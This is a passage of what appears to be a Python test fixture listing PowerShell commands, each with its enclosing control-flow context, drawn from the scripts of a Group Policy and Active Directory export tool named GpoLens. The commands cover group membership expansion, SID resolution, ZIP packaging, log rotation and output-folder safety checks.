        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            'Write-Progress -Activity "Export complete" -Completed',
            ("guard if ($DryRun) -> return",),
        ),
        (
            'Write-Host "`nExport summary:`n Succeeded ($($successSections.Count)):"',
            ("guard if ($DryRun) -> return",),
        ),
        (
            'Write-Host " - $s"',
            (
                "guard if ($DryRun) -> return",
                "foreach ($s in $successSections)",
            ),
        ),
        (
            'Write-Host " Failed ($($failedSections.Count)):"',
            (
                "guard if ($DryRun) -> return",
                "if ($failedSections.Count -gt 0) after []",
            ),
        ),
        (
            'Write-Host " - $s"',
            (
                "guard if ($DryRun) -> return",
                "if ($failedSections.Count -gt 0) after []",
                "foreach ($s in $failedSections)",
            ),
        ),
        (
            'Write-Host " All sections succeeded."',
            (
                "guard if ($DryRun) -> return",
                "else of [($failedSections.Count -gt 0)]",
            ),
        ),
        (
            "New-GpoExportZip -ExportPath $out",
            (
                "guard if ($DryRun) -> return",
                "if (-not $NoZip) after []",
            ),
        ),
        (
            "[System.IO.Compression.ZipFile]::Open($archive, 'Create')",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
            ),
        ),
        (
            "$f.FullName.Substring($rootLen).Replace('\\', '/')",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            (
                "[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile( $zip, "
                "$f.FullName, $entryName)"
            ),
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "finally",
            ),
        ),
        (
            '[System.IO.File]::WriteAllText($testFile, "test")',
            ("try",),
        ),
    ),
    "Export-GroupMembers.ps1": (
        (
            "Get-Content $PrincipalsPath -Raw -Encoding UTF8",
            (),
        ),
        (
            "ConvertFrom-Json",
            (),
        ),
        (
            'Where-Object { $_.Value.type -eq "Group" }',
            (),
        ),
        (
            'Write-Host "Found $($groups.Count) groups to expand"',
            (),
        ),
        (
            'Write-Host " Expanding $name ($sid)..."',
            ("foreach ($grp in $groups)",),
        ),
        (
            "Get-ADGroupMember -Identity $sid -Recursive @adParams -ErrorAction Stop",
            (
                "foreach ($grp in $groups)",
                "try",
            ),
        ),
        (
            'Write-Host " $($memberSids.Count) members"',
            (
                "foreach ($grp in $groups)",
                "try",
            ),
        ),
        (
            'Write-Host " FAIL: $($_.Exception.Message)"',
            (
                "foreach ($grp in $groups)",
                "catch []",
            ),
        ),
        (
            'Get-Date -Format "o"',
            (),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (),
        ),
        (
            "Set-Content $OutputPath -Encoding UTF8",
            (),
        ),
        (
            'Write-Host "Done: $expanded expanded, $failed failed -> $OutputPath"',
            (),
        ),
    ),
    "Export-Principals.ps1": (
        (
            "Test-Path $SddlSource",
            ("if-condition after []",),
        ),
        (
            'Write-Host "Reading SDDL from: $SddlSource"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            'Join-Path $SddlSource "AllGPOs.xml"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            "Test-Path $allXml",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if-condition after []",
            ),
        ),
        (
            'Join-Path $SddlSource "reports"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            "Test-Path $reportsDir",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if-condition after []",
            ),
        ),
        (
            'Get-ChildItem $reportsDir -Filter "*.xml" -ErrorAction SilentlyContinue',
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $reportsDir) after []",
            ),
        ),
        (
            "Get-Content $f -Raw -ErrorAction Stop",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "foreach ($f in $xmlFiles)",
                "try",
            ),
        ),
        (
            'Join-Path $SddlSource "gpo-metadata.json"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            "Test-Path $metaFile",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if-condition after []",
            ),
        ),
        (
            "Get-Content $metaFile -Raw",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $metaFile) after []",
                "try",
            ),
        ),
        (
            'Write-Host "Collecting SDDL from live AD via Get-ADObject..."',
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            "Get-ADDomain @adParams",
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            (
                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                '"(objectClass=groupPolicyContainer)" -Properties nTSecurityDescriptor, '
                "displayName @adParams"
            ),
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            'Write-Host "Found $($allSids.Count) unique SIDs to resolve"',
            (),
        ),
        (
            "Sort-Object",
            ("foreach ($sid in $allSids | Sort-Object)",),
        ),
        (
            "New-Object System.Security.Principal.SecurityIdentifier($sid)",
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "try",
            ),
        ),
        (
            'Write-Host " $sid -> $translated"',
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "try",
            ),
        ),
        (
            'Write-Host " $sid -> (unresolved)"',
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "catch []",
            ),
        ),
        (
            "Where-Object { $_ -match '^S-1-5-21-' -and $principals[$_].type -eq 'Unresolved' }",
            (),
        ),
        (
            'Write-Host "Resolving $($domainSids.Count) domain SIDs via Get-ADObject..."',
            ("if ($domainSids.Count -gt 0) after []",),
        ),
        (
            "Get-ADDomain @adParams",
            (
                "if ($domainSids.Count -gt 0) after []",
                "if (-not $dom) after []",
                "try",
            ),
        ),
        (
            (
                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties objectClass, "
                "sAMAccountName, name @adParams -ErrorAction Stop"
            ),
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
            ),
        ),
        (
            'Write-Host " AD: $sid -> $sam ($ptype)"',
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            'Write-Host " AD resolve failed for $sid : $($_.Exception.Message)"',
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "catch []",
            ),
        ),
        (
            'Get-Date -Format "o"',
            (),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (),
        ),
        (
            "Set-Content $OutputPath -Encoding UTF8",
            (),
        ),
        (
            'Write-Host "Done: $resolved resolved, $unresolved unresolved -> $OutputPath"',
            (),
        ),
    ),
    "Run-GpoLensCollection.ps1": (
        (
            "Join-Path $PSScriptRoot 'Export-GpoEstate.ps1'",
            (),
        ),
        (
            ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            (),
        ),
        (
            "Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1'",
            (),
        ),
        (
            "Get-Date -Format o",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "Test-Path -LiteralPath $LogPath",
            (
                "function Write-GpoLensCollectionLog",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $LogPath",
            (
                "function Write-GpoLensCollectionLog",
                "if-condition after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $next",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $next -Force -ErrorAction Stop",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if (Test-Path -LiteralPath $next) after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $old",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if-condition after []",
            ),
        ),
        (
            "Move-Item -LiteralPath $old -Destination $next -ErrorAction Stop",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if (Test-Path -LiteralPath $old) after []",
            ),
        ),
        (
            "Add-Type -AssemblyName System.IO.Compression.FileSystem",
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' -ErrorAction Stop",
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            (
                "Where-Object { $_.BaseName -match '^.+-\\d{8}-\\d{6}$' -and (Test-Path "
                "-LiteralPath (Join-Path (Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml') "
                "-PathType Leaf) }"
            ),
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            (
                "Test-Path -LiteralPath (Join-Path (Join-Path $OutputRoot $_.BaseName) "
                "'AllGPOs.xml') -PathType Leaf"
            ),
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "Join-Path (Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml'",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "Join-Path $OutputRoot $_.BaseName",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            (
                "Sort-Object @{ Expression = { $_.BaseName.Substring($_.BaseName.Length - 15) "
                "}; Descending = $true }, Name"
            ),
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            'Write-Warning "Skipping incomplete ZIP (no estate report): $($archive.Name)"',
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "try",
                "else of [($zip.GetEntry('AllGPOs.xml'))]",
            ),
        ),
        (
            'Write-Warning "Skipping unreadable/incomplete ZIP: $($archive.Name)"',
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "catch []",
            ),
        ),
        (
            "Get-Item -LiteralPath $directory -Force",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $directory -Force",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
            ),
        ),
        (
            "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
            ("function Assert-GpoLensCollectionOwner",),
        ),
        (
            "Test-Path -LiteralPath $marker -PathType Leaf",
            (
                "function Assert-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "Test-Path -LiteralPath $OutputRoot",
            (
                "function Invoke-GpoLensCollection",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $OutputRoot -Force",
            (
                "function Invoke-GpoLensCollection",
                "if-condition after []",
            ),
        ),
        (
            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.lock'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.log'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
            ),
        ),
        (
            "Write-GpoLensCollectionLog @logArgs -Message 'Collection started'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Resolve-Path -LiteralPath $InventoryPath",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "ConvertFrom-Json",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "ForEach-Object { $previous[$_.FullName] = $true }",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "& $CollectorPath -OutputRoot $OutputRoot *>&1",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                "ForEach-Object { Write-GpoLensCollectionLog @logArgs -Message ($_ | "
                "Out-String).TrimEnd() }"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Write-GpoLensCollectionLog @logArgs -Message ($_ | Out-String).TrimEnd()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Out-String",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Where-Object { -not $previous.ContainsKey($_.FullName) }",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Join-Path $OutputRoot $newest.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "Add-Type -AssemblyName System.IO.Compression.FileSystem",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "Join-Path $exportDir 'gpo-inventory.json'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $newest.FullName -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "catch []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Path $CopyTo -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Out-Null",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Join-Path $CopyTo $newest.Name",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Copy-Item -LiteralPath $newest.FullName -Destination $partial",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "try",
            ),
        ),
        (
            "Move-Item -LiteralPath $partial -Destination $delivery -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $partial",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "finally",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $partial -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "finally",
                "if (Test-Path -LiteralPath $partial) after []",
            ),
        ),
        (
            'Write-GpoLensCollectionLog @logArgs -Message "ZIP delivered: $delivery"',
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                "Where-Object { [string]::Equals($_.BaseName.Substring(0, $_.BaseName.Length - "
                "16), $producerPrefix, [StringComparison]::Ordinal) }"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Select-Object -Skip $Retention",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
